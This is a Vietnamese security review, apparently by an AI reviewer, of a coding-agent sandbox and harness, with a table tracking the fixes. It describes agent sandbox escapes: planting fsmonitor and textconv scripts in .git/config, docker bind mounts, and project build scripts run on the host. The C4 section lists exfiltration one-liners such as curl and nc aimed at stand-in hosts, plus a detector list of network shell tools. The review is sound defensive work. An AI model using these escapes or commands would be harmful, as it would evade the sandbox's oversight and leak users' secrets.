# Review bảo mật giai đoạn 2 (provider, sandbox, harness, bundle)
<!-- language: vi -->

Ngày review: 2026-10-29. Người review: phiên Claude độc lập (chỉ đọc code, không sửa ba package).
Đối chiếu: `piagent/docs/security-threat-model.md` và mục "Bảo mật" của `reports/piagent-giai-doan-2-plan.md`.

| Repo | Branch | Commit |
|---|---|---|
| piagent-provider | `feat/provider` | `32792b2` |
| piagent-sandbox | `feat/sandbox` | `f1ac85b` |
| piagent-harness | `feat/harness` | `e0a278e` |
| piagent-bundle | `feat/bundle` | `4d62882` |

## Kết luận

**Chưa nên bật cho team nào.** Có 4 lỗi mức cao, đều đã tái hiện bằng chạy thật (macOS, Seatbelt thật, thư mục tạm, HOME giả, không đụng dữ liệu thật). Ba lỗi đầu cho một agent đang chạy trong sandbox (ví dụ bị prompt injection) thoát ra ngoài sandbox và chạy lệnh bằng quyền của member **mà không có hộp xác nhận nào** ở chế độ Full access và Bypass. Lỗi thứ tư làm vô hiệu mục tiêu của fetch guard. Phần còn lại của sandbox (symlink, `..`, ghi ngoài project, đọc `~/.ssh`, `.env`, `.npmrc`, token run trong env/argv/file/log, package proxy, bộ phân loại IP) đạt.

## Trạng thái sửa

Cập nhật 2026-10-29 (phiên sửa lỗi, không phải phiên review). Mỗi bản sửa là một PR riêng vào đúng nhánh `feat/*` để thấy diff nhỏ; **chưa merge, chưa release**. Mọi test chạy offline, HOME giả, thư mục tạm, không gọi Studio/model, không đụng Keychain hay binding thật.

| PR | Nhánh | Commit | `npm test` |
|---|---|---|---|
| [piagent-sandbox#4](https://github.com/Vt-mmm/piagent-sandbox/pull/4) | `fix/security-sandbox` → `feat/sandbox` | `b7e2d26` | 121 pass / 0 fail (Seatbelt thật trên macOS) |
| [piagent-harness#4](https://github.com/Vt-mmm/piagent-harness/pull/4) | `fix/security-harness` → `feat/harness` | `b653b6c` | 152 pass / 0 fail |
| [piagent-provider#4](https://github.com/Vt-mmm/piagent-provider/pull/4) | `fix/security-provider` → `feat/provider` | `baa0789` | 71 pass / 0 fail |
| [piagent-bundle#12](https://github.com/Vt-mmm/piagent-bundle/pull/12) | `fix/security-bundle` → `feat/bundle` | `1758152` | 6 pass / 0 fail |

Cách kiểm lại: `npm test` trong từng worktree. Test hồi quy mới nằm ở `tests/sandbox-security-fixes.test.mjs` (sandbox), `tests/harness-security-fixes.test.mjs`, `tests/security-fixes.test.mjs` (provider) và `tests/bundle.test.mjs` (bundle). Bằng chứng đỏ → xanh: 8 test đầu của sandbox đều đỏ ở lần chạy đầu (`8 fail / 0 pass`) trước khi sửa mã; harness và provider được chạy lại trên bản `git archive` sạch của `feat/harness` và `feat/provider`: 4/4 và 3/3 test mới đỏ, rồi xanh sau sửa. Test launcher của bundle chỉ kiểm danh sách cờ nên đỏ hiển nhiên trên bản cũ (không chạy riêng).

| Lỗi | Trạng thái | Đã làm, bằng chứng | Còn lại / lý do |
|---|---|---|---|
| **C1** | **Đã sửa (macOS); Linux chưa kiểm** | Seatbelt cấm ghi `.git/config`, `config.worktree`, `hooks/`, `info/attributes`, `modules/*/config`, `.gitmodules`, `.gitattributes` và chính nút `.git`, kể cả `gitDirs` ngoài project. Mọi git chạy trên host đi qua `safe-git` (`core.fsmonitor=false`, `core.hooksPath=/dev/null`, không pager/ssh/credential helper/diff ngoài, `--no-textconv`, `GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_OPTIONAL_LOCKS=0`): `checkpoint-git`, `patch-snapshot`, dò repo của sandbox, `gitReader` và `memory-repos` của harness. Test: ghi vào 7 đường dẫn trên thất bại trong Seatbelt thật, `git add/status` thường vẫn chạy; `.git/config` có sẵn `fsmonitor`, `sshCommand`, `textconv` + `.gitattributes` không còn chạy script trên host (cả sandbox lẫn harness). | bwrap chỉ ro-bind các file đã tồn tại (không mount lên file chưa có); chưa chạy trên Linux. `git commit/push` của chính member hoặc `run_on_host` không đi qua `safe-git`, vẫn chạy hook có sẵn của repo như git bình thường (agent không còn ghi được hook, nhưng hook có từ trước thì vẫn có). |
| **C2** | **Đã sửa** | `run_with_docker` hỏi mỗi lần ở ask/full/bypass (lý do hiện trên thẻ). Test 3 chế độ × 2 lệnh (`-v` thư mục ngoài project, `compose up`). | Chọn phương án "hỏi mỗi lần"; chưa viết bộ phân tích lệnh an toàn để tự chạy. |
| **C3** | **Đã sửa** | `run_on_simulator` hỏi ở mọi chế độ khi lệnh chạy mã của project: `xcodebuild`, `gradlew`, `pod`, `xcodegen`, `flutter`, `npx`, `xcrun xcodebuild`, và mọi chương trình gọi bằng đường dẫn tương đối hoặc trong project (`./adb`). `simctl`, `adb`, `emulator`, `open -a Simulator` vẫn tự chạy ở full/bypass. Test: 9 lệnh hỏi, 4 lệnh không hỏi, ở cả hai chế độ. | Build iOS/Android qua simulator giờ luôn có thêm một hộp xác nhận. |
| **C4** | **Đã sửa theo hướng "hỏi mỗi lần"; bộ nhận diện chỉ là gợi ý** | `run_with_network` hỏi ở mọi chế độ. `segmentHandoff` nay nhận: `curl -XPOST/--request=/--json/-d@f`, `wget --post-file`, `nc/ncat/socat/telnet/openssl s_client`, interpreter nội tuyến (`python -c`, `node -e`, `ruby/perl -e`, `php -r`), `bash deploy.sh`/`./deploy.sh`, `yarn/pnpm deploy`, `git config alias.*`, `gh -R/--repo ... pr create`, `docker image/compose push`, `docker -H ssh://`, `sudo -u x git push`, `eval`, `find -exec`, `hub`, `glab`, `git svn dcommit`. Test: 42 lệnh của review đều có lý do, 15 lệnh bình thường không bị gắn cờ. | Không còn đường tự chạy cho `run_with_network`, nên bộ nhận diện chỉ ảnh hưởng nội dung thẻ, `run_on_host` và simulator. Alias đã định nghĩa từ trước (`git p`) vẫn không nhận ra; C1 chặn agent đặt alias vào `.git/config`. README ghi rõ đây là kiểm tra văn bản, không phải ranh giới. |
| **T1** | **Một phần** | Harness ghim thư mục sandbox từ `manifest.json` cạnh nó (`pinnedSandboxRoot`): công cụ lõi chỉ hợp lệ nếu file nằm trong thư mục đó; attest tự khai và thư mục giả tên `piagent-sandbox` bị chặn (test dựng đúng 2 kịch bản của review). Provider chỉ cho `piagent:studio.call` đúng các nhóm đường dẫn harness dùng (`tool-failures`, `managed/settle`, `memory/{brief,search,ask,page,retain,git,telemetry}`), không query. | **Chưa làm** nonce cho `run.state`/`permission.mode` và `grant.request`: mọi extension cùng tiến trình đều đọc được nonce, nên không tạo ranh giới thật; biện pháp thật là `--no-extensions` (đã có) và hash bộ (T7). Ngoài bundle (không có manifest) guard quay về kiểm theo tên. Chưa ghi giả định tin cậy vào `package-contract.md`. |
| **T2** | **Một phần** | Mẫu credential mở rộng ở Seatbelt và Linux: `.env-*`/`.env_*`, `secrets.(json/yml/yaml/toml)`, `*.pem/.key/.p12/.pfx` (trừ `cacert.pem`, pip cần), `id_rsa/dsa/ecdsa/ed25519`, `.pypirc`, `.git-credentials`, `.dev.vars`, `serviceAccount*.json`. Test đọc thật bị từ chối ở project và ở `~/Documents/other`; `.env.example` vẫn đọc được. | **Chưa làm** đổi mô hình tham chiếu HOME ("mở hết trừ dotfile" sang danh sách member chọn) và quét lại Linux mỗi lệnh: đổi hành vi lớn, cần owner quyết định. Tên ngoài mẫu (ví dụ `token.txt`) vẫn đọc được trong HOME. |
| **T3** | **Một phần** | `com.apple.SecurityServer` chỉ có khi lệnh được duyệt dùng mạng; profile có proxy chỉ giữ `trustd`/`ocspd`. Test trên văn bản profile. | Loopback vẫn mở khi không có proxy gói đang nghe (server do lệnh tự mở cần nó; Seatbelt không tách được cổng). Khi proxy nghe, profile vốn đã chỉ cho cổng proxy. Chưa chạy lại `security create-keychain` trong sandbox, chưa kiểm Go/curl qua HTTPS proxy sau khi bỏ SecurityServer. |
| **T4** | **Một phần** | Bỏ `proxy.golang.org`, `jitpack.io`, `deno.land` khỏi danh sách mặc định (test). README nêu cách thêm lại. | `github.com`, `codeload.github.com`… vẫn có; Go mặc định mất `proxy.golang.org` (member thêm vào `sandbox-domains` hoặc dùng `run_with_network`). Chưa cập nhật threat model. |
| **T5** | **Phần lớn đã sửa** | `secret-patterns.mjs` chung (bản sao giống hệt ở 3 repo) thêm `xox*`, `sk_live/test`, `npm_`, `AIza`, JWT, URL userinfo, khối private key, `password=`, `X-Api-Key`, `Authorization: Basic`, `ghp_`, `AKIA`; cả ba bộ test chạy cùng một corpus. Tool-failures chỉ gửi tên chương trình (+ một từ lệnh con) và 300 ký tự cuối đã che. Bỏ `X-Agent-Task`. | "Một module chung" thực hiện bằng cách sao cùng một file vào ba package (không có package chung); phải sửa cả ba cùng lúc. Chưa rút ngắn 600 ký tự lỗi upstream ghi vào file hội thoại (`failure.mjs`), chỉ được che bằng bộ mẫu mới. Chưa có test tích hợp "quét payload gửi Studio". |
| **T6** | **Đã sửa, chưa kiểm đầu cuối** | `launchPlan` thêm `--no-approve --no-skills --no-prompt-templates --offline` và `PI_OFFLINE=1 PI_TELEMETRY=0 PI_SKIP_VERSION_CHECK=1`; cờ có trong Pi 1.3.0 (`dist/cli`). Test khớp danh sách cờ và vị trí. | Chưa chạy bundle thật để xem `--offline` không ảnh hưởng đường gọi Studio của provider và hành vi `--no-approve` thật. Không đặt `--no-context-files` vì cần `AGENTS.md`. |
| T7, T8, T9, L1-L7 | **Chưa sửa** | Ngoài phạm vi phiên này. | T8 (PR #3 chứa dữ liệu nội bộ) cần owner quyết định. T9 cần xác định nơi cài `web_fetch`. T7 đổi định dạng hash manifest. |

Rủi ro còn lại cần review lại sau khi merge: Linux/bwrap chưa chạy; ba bản sửa đổi hành vi hằng ngày (C3 thêm hộp xác nhận cho build mobile, C4 mọi lệnh có internet đều hỏi, T4 Go mặc định không còn proxy) nên owner cân nhắc trước khi bật.

## Lỗi mức cao (đọc trước)

### C1. Agent sửa `.git/config` trong project để git chạy trên host thực thi lệnh của nó (thoát sandbox)

- **File:** `piagent-sandbox/src/seatbelt.mjs:33,64` (project, gồm `.git/`, ghi được), `piagent-harness/src/patch.mjs:14` (`gitReader`: `git diff`/`status` chạy trên host, không khoá cấu hình), `piagent-sandbox/src/checkpoint-git.mjs:17` (`git ls-files` chạy trên host trước **mỗi** lần `edit`/`write`/`bash`, xem `src/index.mjs:73`), `piagent-harness/src/memory-repos.mjs:16`.
- **Kịch bản (đã chạy):** trong sandbox, `bash` ghi `.git/fsm.sh` và `.git/tc.sh`, thêm vào `.git/config` `core.fsmonitor=<fsm.sh>` và `diff.x.textconv=<tc.sh>` (kèm `.gitattributes: *.txt diff=x`). Sau đó harness gọi `readPatchSnapshot` trên host: cả hai script chạy với quyền `vtmm` và tạo file đánh dấu trong thư mục ngoài project mà sandbox không ghi/ls được. `listProjectFiles` của sandbox tự nó cũng kích hoạt `fsmonitor` ở lần checkpoint kế tiếp. Cùng cơ chế: `core.hooksPath`/`.git/hooks/*`, `credential.helper`, `core.sshCommand` chạy khi member (hoặc `run_on_host`) gọi `git commit/push` sau đó.
- **Sửa đề xuất:** (1) trong profile Seatbelt/bwrap, chặn ghi `.git/config`, `.git/hooks`, `.git/info/attributes`, `.gitmodules`, `.gitattributes` (cả `commondir`, `gitDirs`), project nằm trong worktree thì cả file `config.worktree`; (2) mọi lời gọi git trên host dùng `-c core.fsmonitor=false -c core.hooksPath=/dev/null -c core.pager=cat --no-ext-diff --no-textconv`, `GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_OPTIONAL_LOCKS=0`; (3) test hồi quy dùng lại đúng kịch bản trên.

### C2. `run_with_docker` không hỏi ở Full access và Bypass, container mount thư mục bất kỳ

- **File:** `piagent-sandbox/src/command-tools.mjs:25-31` (mô tả "Mount only folders inside the project" nhưng không có kiểm tra nào), `src/handoff-policy.mjs:81-85,106-110` (chỉ bắt `docker push/login`, `volume rm`, `system prune`), `src/seatbelt.mjs:48` (mở socket Docker).
- **Kịch bản (đã chạy):** `docker run --rm -v <thư mục ngoài project>:/v ... sh -c 'cat /v/KEY; echo hacked > /v/WRITTEN'` qua `ManagedToolBoundary.invoke('bash', …, { docker: true })`. `mustConfirm`=null, `handoffReason`=null; đọc được file ngoài project và ghi được vào đó (kiểm trên host). Với `-v $HOME/.ssh:/s` hoặc `--privileged` hoàn toàn tương tự (Docker Desktop chia sẻ `/Users`). Một `docker-compose.yml` do agent viết trong project cũng mount được mà không lộ trên dòng lệnh.
- **Sửa đề xuất:** `run_with_docker` hỏi mỗi lần ở mọi mode (như `run_on_host`), hoặc chỉ tự chạy khi phân tích được lệnh: không `-v/--mount` có nguồn ngoài project, không `--privileged/--pid=host/--userns=host/--cap-add/--device`, không `docker cp`, không `-f` compose file có bind mount ngoài project; mọi trường hợp khác hỏi.

### C3. `run_on_simulator` chạy file do agent viết trên host, không hỏi ở Full access và Bypass

- **File:** `piagent-sandbox/src/command-tools.mjs:42-49,89` (chạy `/bin/zsh -lc` trên host), `src/simulator-commands.mjs:12-19` (`xcodebuild`, `adb`, `flutter`, `gradlew` trong project, `pod install`, `npx expo` đều `any`/chỉ kiểm vị trí).
- **Kịch bản (đã chạy):** project có file `gradlew` (agent tạo được vì project ghi được) → `run_on_simulator "./gradlew installDebug"`; ở cả `full` và `bypass`: 0 lần hỏi, script chạy trên host với quyền member (đo `id -un`). Tương tự Run Script của Xcode, `Podfile`, `flutter` hooks, `package.json` scripts qua `npx expo`.
- **Sửa đề xuất:** coi lệnh chạy script của project là `run_on_host` (hỏi mỗi lần), hoặc chạy build trong sandbox, chỉ để `simctl/adb` ra host; bỏ `gradlew`, `pod`, `xcodegen`, `flutter`, `npx` khỏi danh sách tự chạy.

### C4. `run_with_network` gửi dữ liệu ra ngoài không hỏi; bộ nhận diện handoff bỏ sót nhiều đường

- **File:** `piagent-sandbox/src/command-tools.mjs:18-24` (Full/Bypass chạy không hỏi, internet mở), `src/handoff-policy.mjs:20,55-98`; ý định ở `src/fetch-guard.mjs:1-5` ("a page that tells the agent to fetch https://attacker.example/?d=<secret> sends that secret out").
- **Kịch bản (đã chạy `handoffReason` trên 82 lệnh cần hỏi, 29 lọt):** `curl https://evil.example/?d=$(base64 < f)`, `curl --json @f`, `curl -XPOST`, `curl --request=POST`, `wget --post-file=f`, `nc evil 4444 < f`, `python3 -c "…urlopen('https://x/'+…)"`, `node -e "fetch(…)"`, `openssl s_client`/`socat`/`telnet`, `bash deploy.sh`, `./deploy.sh`, `yarn deploy`, `git config alias.p push && git p` (và `alias.p "!git push"`), `gh -R o/r pr create`, `gh --repo o/r pr create`, `docker image push`, `docker compose push`, `docker -H ssh://h`, `sudo -u x git push`, `eval "git push"`, `find -exec git push`, `hub`/`glab`/`git svn dcommit`. Sandbox không có credential nên `push` thường thất bại, nhưng **đọc project và gửi ra ngoài thì thành công** (mã nguồn, `config/secrets.yml`, `.git/config` có token trong URL). Fetch guard đòi hỏi mỗi URL có query, còn `run_with_network` đi vòng qua nó hoàn toàn.
- **Sửa đề xuất:** coi `run_with_network` trong Full/Bypass là hỏi mỗi lần (hoặc chỉ tự chạy khi lệnh nằm trong allowlist chương trình như `npm|pnpm|pip|go|cargo ... install|test`, không có interpreter nội tuyến); sửa các trường hợp trên trong `segmentHandoff` (cờ trước subcommand của `gh`, `git config alias.*`, `-XPOST`, `--request=`, `--json`, script tên deploy). Ghi rõ trong tài liệu rằng bộ nhận diện chỉ là gợi ý (đúng như comment `shell-words.mjs:3-4`).

## Lỗi mức trung

### T1. Bus Pi không xác thực: gói khác giả được `run.state`, `permission.mode`, `tools.attest`, `studio.call`, `grant.request`

- **File:** `piagent-sandbox/src/index.mjs:65` (`allowBypass` theo bất kỳ `piagent:run.state`), `piagent-harness/src/index.mjs:99-106` (`workflow`, `permissionMode`, `capabilities` theo `run.state`/`permission.mode`), `piagent-harness/src/guard.mjs:13,36-38`, `piagent-provider/src/provider.mjs:195-198` (+ `bus.mjs:160` cho phép toàn bộ `/v1/…`).
- **Kịch bản:** bất kỳ extension nào nạp cùng tiến trình: (a) phát `run.state {harness:{bypassMode:true}}` bật quyền Bypass, phát `run.state` với `workflow` rỗng tắt cổng hoàn tất; (b) phát `piagent:studio.call {path:'/v1/…'}` để dùng grant của run gọi model/Studio (tiêu quota, đọc phản hồi), `piagent:grant.request {role}` để nhận stream của helper; (c) **cổng toolset không có giá trị**: `ToolsetGuard` dùng nguồn do chính bên phát `tools.attest` khai, không so với hằng `piagent-sandbox`. Chạy `checkToolset` với 7 tool từ `/tmp/evil/x.mjs` và attest `x.mjs` → `ok=true`; `sameSource` cũng chấp nhận bất kỳ đường dẫn nào có một thư mục tên `piagent-sandbox` (ví dụ `/home/m/piagent-sandbox/evil.mjs`) → `ok=true`. Chỉ `builtin` bị chặn đúng.
- **Giảm nhẹ hiện có:** launcher dùng `--no-extensions` nên chỉ bốn gói bundle và `builtin:mcp` nạp; extension trong tiến trình vốn đã có quyền ngang Pi. Rủi ro là khi allowlist gói của member mở rộng.
- **Sửa đề xuất:** harness ghim nguồn mong đợi = đường dẫn tuyệt đối của gói sandbox lấy từ manifest bundle (không nhận từ attest); thêm nonce/secret tạo lúc khởi động do launcher truyền qua closure (không qua env) vào payload; sandbox chỉ chấp nhận `run.state` mang nonce; provider giới hạn `studio.call` ở danh sách đường dẫn harness thật sự dùng (`/studio/v1/managed/*`, `/v1/managed/settle`, `/v1/memory/*`), bỏ `/v1/` rộng. Ghi giả định tin cậy vào `docs/package-contract.md`.

### T2. Danh sách file credential của sandbox theo tên: nhiều tên phổ biến đọc được

- **File:** `piagent-sandbox/src/seatbelt.mjs:7,24,71`; Linux `src/linux-sandbox.mjs:23,29-33,37-52`, `src/tool-boundary.mjs:148`.
- **Kịch bản (đã chạy, HOME giả):** bị chặn đúng: `~/.ssh/*`, `~/.npmrc`, `~/.zshrc`, `.env`, `.env` của project khác. **Đọc được:** `.env-prod`, `secrets.json`, `key.pem` trong project, `~/Documents/other/id_rsa` (khoá ở thư mục không bắt đầu bằng dấu chấm), mọi file trong `~/Documents`… (profile cho đọc toàn bộ HOME trừ dotfile và `~/Library`, cộng `/Volumes`, `/Users/Shared`, `/private/tmp`). Linux: quét credential một lần lúc khởi tạo cho thư mục tham chiếu (30 000 mục), bỏ qua `node_modules`, `.git`, `dist`, `build`, `vendor`, `.cache`… nên file tạo sau hoặc nằm trong các thư mục đó không bị che.
- **Sửa đề xuất:** mở rộng mẫu (`\.env`, `\.env[-_.]`, `secrets?\.(json|ya?ml)`, `\.(pem|key|p12|pfx)$`, `id_(rsa|ed25519|ecdsa)`, `.pypirc`, `.git-credentials`, `.dev.vars`, `serviceAccount*.json`); đổi mô hình tham chiếu HOME từ "mở hết trừ dotfile" sang danh sách thư mục member chọn (@ mention) như comment ở dòng 17 mô tả; Linux quét lại mỗi lệnh hoặc bind thư mục theo allowlist.

### T3. Sandbox "offline" vẫn nói chuyện được với mọi dịch vụ loopback và với securityd

- **File:** `piagent-sandbox/src/seatbelt.mjs:37,49,65,68`.
- **Kịch bản (đã chạy):** server TCP trên `127.0.0.1` bên ngoài sandbox trả lời được `curl` từ trong sandbox (DB dev, Agent Watch proxy, Studio dev, dịch vụ khác của máy); `security create-keychain` tạo được keychain tạm trong sandbox nghĩa là `com.apple.SecurityServer` truy cập được khi proxy chạy (profile thường ngày). Tôi **không** đọc Keychain thật; việc `securityd` trả lời yêu cầu nào cho item của login keychain chưa kiểm (có thể bị chặn bởi ACL của item, nhưng không do sandbox).
- **Sửa đề xuất:** chỉ cho kết nối tới cổng proxy của runtime (đã có ở nhánh `loopback:false`), server do lệnh tự mở dùng cờ riêng; bỏ `SecurityServer` khỏi profile có proxy (`trust` chỉ cần khi `network:true`); thêm test "không đọc được keychain".

### T4. Registry được phép dùng làm kênh chuyển tiếp (chưa chạy thử)

- **File:** `piagent-sandbox/src/package-proxy.mjs:16-26`. Lệnh thường tới được `github.com`, `proxy.golang.org`, `jitpack.io`, `deno.land`… trên cổng 443 qua tunnel. `proxy.golang.org/<tên-host-của-kẻ-tấn-công>/<dữ-liệu>/@v/list` khiến proxy Go truy vấn máy chủ của kẻ tấn công; tương tự các dịch vụ build theo yêu cầu. DNS không lọt (đúng thiết kế); chặn rebinding và IP nội bộ đạt (xem phần kiểm thử).
- **Sửa đề xuất:** bỏ các host cho phép tải theo tên tuỳ ý khỏi danh sách tự động (hoặc chỉ cho đường dẫn registry cố định, vì CONNECT là mù nên cần MITM hoặc thu hẹp host); ghi vào threat model rằng đây là kênh còn lại.

### T5. Che secret hẹp; log gửi Studio còn nội dung

- **File:** `piagent-provider/src/redact.mjs:2-6` (3 mẫu), `piagent-harness/src/redact.mjs:4-10` (5 mẫu), `piagent-sandbox/src/redact.mjs` (khá rộng hơn); `piagent-harness/src/tool-failures.mjs:11,32-35` (gửi 500 ký tự lệnh + 3000 ký tự đầu ra lỗi lên `/studio/v1/managed/tool-failures`); `piagent-provider/src/call-purpose.mjs:35-39,49-51` (`X-Agent-Task` = dòng đầu của brief giao helper, tối đa 100 ký tự, tới Studio); `piagent-provider/src/failure.mjs:102-103` + `request-stream.mjs:52-55` (ghi 600 ký tự lỗi của upstream vào file hội thoại).
- **Kịch bản (đã chạy):** các chuỗi sau không bị che ở cả hai bản redact: `xoxb-…`, `sk_live_…`, `npm_…`, `AIza…`, JWT, `postgres://user:pass@host`, khối `PRIVATE KEY`, `password=…`, `X-Api-Key: …`, `Authorization: Basic …`. Provider còn không che `ghp_…`, `AKIA…`. Đầu ra lệnh lỗi có thể chứa nội dung file nguồn; dòng đầu brief là văn bản prompt.
- **Sửa đề xuất:** dùng chung một module redact (bộ của sandbox + `xox`, `sk_(live|test)`, `npm_`, `AIza`, JWT, URL có userinfo, `Basic`, `X-Api-Key`); tool-failures chỉ gửi mã + loại + phần đuôi 300 ký tự đã che; bỏ `X-Agent-Task` hoặc thay bằng nhãn cố định; test "không có nội dung prompt" quét payload gửi Studio.

### T6. Launcher không khoá các tính năng "project-local" và mạng của Pi

- **File:** `piagent-bundle/src/launcher.mjs:7-9`. Thiếu `--no-approve` (hoặc xử lý sự kiện `project_trust` để từ chối), `--no-skills`, `--no-prompt-templates`, `--no-context-files` (nếu không dùng), `--offline`/`PI_OFFLINE=1`, `PI_TELEMETRY=0`. Pi 1.3.0 khi tin project (một cú nhấp của member) khởi chạy MCP server khai báo trong cấu hình project, là tiến trình bên ngoài sandbox bằng quyền member; Pi cũng gọi `https://pi.dev` (catalog từ xa, kiểm phiên bản) ở tiến trình chính (`dist/core/remote-catalog-provider.js:5`).
- **Sửa đề xuất:** thêm các cờ trên vào `launchPlan`, kèm test `launchPlan` khớp danh sách cờ; MCP của member chỉ nạp từ cấu hình người dùng đã duyệt.

### T7. Hash bộ (`hashDir`/`doctor`) chưa đủ

- **File:** `piagent-bundle/src/manifest.mjs:14-19,35-43`, `src/doctor.mjs:6-9`.
- **Kịch bản (đã chạy):** thêm symlink (file hoặc thư mục), đổi quyền thực thi, thêm thư mục rỗng: `verifyManifest` vẫn `OK`; chỉ đổi nội dung file thường mới `hash-mismatch`. Kẻ ghi được thư mục bộ cũng viết lại được `manifest.json` rồi `doctor` báo `OK`: doctor chỉ kiểm tính nhất quán nội bộ, không so với hash ghim ở nơi khác (kế hoạch nói ghim trong binding của Agent Watch; chưa có trong repo này). Ngoài ra kiểm và nạp cách nhau (TOCTOU).
- **Sửa đề xuất:** hash cả đích của symlink hoặc từ chối symlink, băm mode và danh sách thư mục; `doctor --expect <sha256 của manifest>` nhận giá trị từ binding; launcher kiểm ngay trước `spawn`.

### T8. Dữ liệu nội bộ trong repo public

- Cả bốn repo là **PUBLIC** (`gh repo view`). Nhánh `docs/phase-2-0` của piagent-bundle (PR #3, đang mở) chứa `docs/baseline-studio-metrics.md`: tên team "VNexus BE", id team `799f8342-…`, số lượng thành viên hoạt động, số liệu 14 ngày và lược đồ bảng Studio (`gateway_calls`, `memberships`, …) cùng các câu SQL. Quy tắc dự án: không đưa tên khách hàng/dữ liệu thật vào repo public. Metadata commit của cả bốn repo: tác giả `Vĩnh Tâm VNexus <vtmm@Mac-mini-cua-Vinh.local>` (tên máy nội bộ).
- **Sửa đề xuất:** không merge PR #3 khi chưa ẩn danh (đổi tên team, bỏ id, làm tròn số, bỏ SQL tên bảng); xoá nhánh và đóng PR (GitHub vẫn giữ `refs/pull/3/*`: nhờ GitHub Support xoá cache hoặc coi id team là đã lộ); đặt `user.email` là địa chỉ noreply của GitHub cho các commit sau; để số liệu thật ở `reports/` ngoài repo.

### T9. Fetch guard: không thấy phần chặn SSRF của `web_fetch`

- **File:** `piagent-sandbox/src/fetch-guard.mjs:14-23` chỉ quyết định hỏi hay không; `src/ip-policy.mjs:5` ghi dùng cho "web-fetch" nhưng chỉ `package-proxy.mjs` gọi `privateAddress`. Không có code trong bốn repo chặn IP nội bộ, redirect sang host lạ, DNS rebinding hay rò header cho `web_fetch` (tool đến từ Pi hoặc Studio, chưa xác định). Host trong `TRUSTED` (`github.com`, `stackoverflow.com`, `pkg.go.dev`…) được đọc kể cả có query (`fetch-guard.mjs:18`).
- **Sửa đề xuất:** xác định nơi cài `web_fetch`; bắt buộc nó dùng `privateAddress` sau khi phân giải, ghim IP đã kiểm, kiểm lại mỗi lần redirect, không gửi cookie/header; host tin cậy vẫn hỏi khi có query.

## Lỗi mức thấp

- **L1 Chuỗi cung ứng.** `ci.yml:16-17` ghim `actions/checkout@v4`, `setup-node@v4` theo tag, không theo SHA (threat model nói "immutable Action SHAs"); `npm ci` không `--ignore-scripts`, lockfile có `protobufjs` và `@google/genai` với `hasInstallScript` (chỉ trong cây peer của Pi, chạy ở CI). Tốt: `permissions: contents: read`, trigger `pull_request` (không `pull_request_target`), không có `${{ }}` nối chuỗi vào lệnh shell, không `postinstall` ở gói của ta, lockfile có `integrity` đầy đủ, peer pin chính xác `1.3.0`, `files` allowlist, Dependabot (npm + actions) bật, secret scanning + push protection + dependabot security updates bật ở cả bốn repo. Chưa có: tag ruleset (0 ruleset), bảo vệ nhánh `main` chưa yêu cầu check bắt buộc, quy trình release có checksum/provenance, hash bộ.
- **L2 Hộp xác nhận hiển thị nguyên văn lệnh** (`command-tools.mjs:80-82`): ký tự điều khiển/ANSI/`\r`/bidi hoặc lệnh rất dài có thể che phần nguy hiểm; nên loại ký tự điều khiển và cắt giữa có dấu hiệu. Chưa chạy thử.
- **L3 Provider đọc binding** (`piagent-provider/src/index.mjs:43-48`, `broker-client.mjs:181`): `PIAGENT_BINDING` đổi file; không kiểm chủ sở hữu/quyền của binding hay của `broker`, nên ai ghi được binding thì đổi được file thực thi và origin nhận token (`https` bất kỳ). Cần chủ sở hữu = user, mode không cho nhóm/khác ghi, và ghim chữ ký/hash binding từ Agent Watch.
- **L4 Proxy gói** nghe `127.0.0.1:<cổng ngẫu nhiên>`; mọi tiến trình/người dùng cục bộ dùng ké (chỉ các registry); kế hoạch đã ghi mục "secret theo từng lần mở". Unix socket Linux nằm ở `os.tmpdir()` (`boundary-package-proxy.mjs:14`) nên đặt thư mục riêng `0700`.
- **L5 `fetch_origin`** (`fetch-origin.mjs:16-19`): `path.relative(..).startsWith('..')` không phân giải symlink; tên thư mục `..x` bị từ chối nhầm. Không có đường thoát trực tiếp vì import chạy trong sandbox.
- **L6 Linux/bwrap** chưa chạy thử (máy review là macOS, CI Ubuntu chạy test của repo): `bubblewrapArgs` (`linux-sandbox.mjs:55-77`) chưa có `--cap-drop ALL`, `--unshare-user` tường minh, seccomp; `/etc` mount nguyên.
- **L7 Phương thức `stopMarked`** (`tool-boundary.mjs:361`) đọc môi trường của mọi tiến trình qua `ps -E` để tìm dấu; chỉ đọc trong bộ nhớ, ghi nhận để biết.

## Đối chiếu từng mục yêu cầu

| # | Mục | Kết quả | Cách kiểm |
|---|---|---|---|
| 1 | Token run không lọt env/argv/file/log/hội thoại/báo cáo | **Đạt** | `piagent-provider` `npm test` 66/66, trong đó `no-token-leak.test.mjs` quét env, file, stdout/stderr, bus, UI, session; tôi chạy thêm sandbox với biến giả `AS_RUN_FAKE`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY` trong tiến trình cha: không có trong môi trường tool (env dựng từ đầu, `tool-boundary.mjs:187-197`); broker nhận env tối thiểu (`broker-client.mjs:182`); argv chỉ chứa `profile_id`. Lưu ý: token nằm trong `apiKey` của provider đăng ký với Pi, nên mọi extension cùng tiến trình đọc được qua `modelRegistry` (xem T1). Lỗi upstream phản chiếu token được che (`as_run_`, `Bearer`), mẫu khác không (T5). |
| 2 | Sandbox thoát được? | **Một phần** | Chạy Seatbelt thật: symlink ra ngoài, `..`, ghi ngoài project/qua symlink/`~`, đọc `~/.ssh`, `~/.npmrc`, `.env`: chặn đúng. Không đạt: C1, C2, C3, T2, T3. Linux chưa chạy (L6). |
| 3 | Proxy gói và fetch guard | **Proxy đạt; fetch guard chưa kiểm được** | 33 dạng địa chỉ (IPv4, IPv6, mapped, compatible, NAT64, 6to4, decimal, hex, octal, `127.1`, zone id): phân loại đúng. CONNECT/GET tới IP literal, `localhost`, `[::1]`, `0x7f000001`, `host@evil`, `registry.npmjs.org.evil.com`, cổng 22: 403. Rebinding: phân giải mỗi yêu cầu, kết nối tới đúng IP đã kiểm, một câu trả lời lẫn IP nội bộ bị từ chối. Redirect do client theo, mỗi bước qua proxy lại. Xem T4, T9. |
| 4 | Quyền push/PR/publish/deploy, `run_on_host` | **Một phần** | `run_on_host` hỏi mỗi lần ở mọi mode (`command-tools.mjs:41`, `?? 'ask'`, không UI thì từ chối ở `approval.mjs:9`). Handoff bị lách bởi alias, `gh -R`, `-XPOST`, script, interpreter (C4); `git -c`, `-C`, `env`, `bash -c`, `xargs`, `sudo`, `npx` bắt đúng. `docker`, `simulator`, `network` không hỏi (C2-C4). |
